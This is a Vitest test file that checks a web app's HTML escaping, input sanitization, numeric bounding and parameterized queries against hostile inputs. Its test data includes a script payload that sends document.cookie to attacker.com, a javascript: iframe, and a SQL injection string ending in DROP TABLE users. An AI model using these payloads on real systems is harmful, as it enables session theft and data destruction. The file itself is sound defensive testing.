import { EventRepository } from "@/db/repository";
import { escapeHtml, sanitizeInput, sanitizeNumeric } from "@/lib/sanitize";
import { describe, expect, it } from "vitest";

describe("Security Architecture & Threat Mitigation", () => {
  it("escapes malicious HTML characters to prevent Cross-Site Scripting (XSS)", () => {
    const rawPayload = `<script>alert('pwned')</script>&"'/`;
    const escaped = escapeHtml(rawPayload);

    expect(escaped).not.toContain("<script>");
    expect(escaped).toContain("&lt;script&gt;");
    expect(escaped).toContain("&amp;");
    expect(escaped).toContain("&quot;");
    expect(escaped).toContain("&#x27;");
  });

  it("strips script tags, iframes, and javascript: protocols from input", () => {
    const maliciousPayload =
      'Hello <script>fetch("https://attacker.com/steal?c="+document.cookie)</script><iframe src="javascript:alert(1)"></iframe> world!';
    const sanitized = sanitizeInput(maliciousPayload);

    expect(sanitized).not.toContain("<script>");
    expect(sanitized).not.toContain("</script>");
    expect(sanitized).not.toContain("<iframe");
    expect(sanitized).toBe("Hello  world!");
  });

  it("safely bounds and validates numeric financial values against NaN and Infinity", () => {
    expect(sanitizeNumeric(Number.NaN, 5000)).toBe(5000);
    expect(sanitizeNumeric(Number.POSITIVE_INFINITY, 0)).toBe(0);
    expect(sanitizeNumeric(-50, 0, 0, 100000)).toBe(0);
    expect(sanitizeNumeric(45000.75)).toBe(45001);
    expect(sanitizeNumeric(200_000_000, 0, 0, 100_000_000)).toBe(100_000_000);
  });

  it("demonstrates SQL Injection immunity via parameterized prepared statements", () => {
    // Attempt SQL injection via event ID query parameter
    const maliciousId = "evt-123' OR '1'='1'; DROP TABLE users; --";

    // Prepared statement should treat maliciousId strictly as a string literal and return null/empty
    const result = EventRepository.getEventById(maliciousId);
    expect(result).toBeNull();

    // Verify database tables remain intact and uncompromised
    const allEvents = EventRepository.getAllEvents();
    expect(Array.isArray(allEvents)).toBe(true);
  });
});
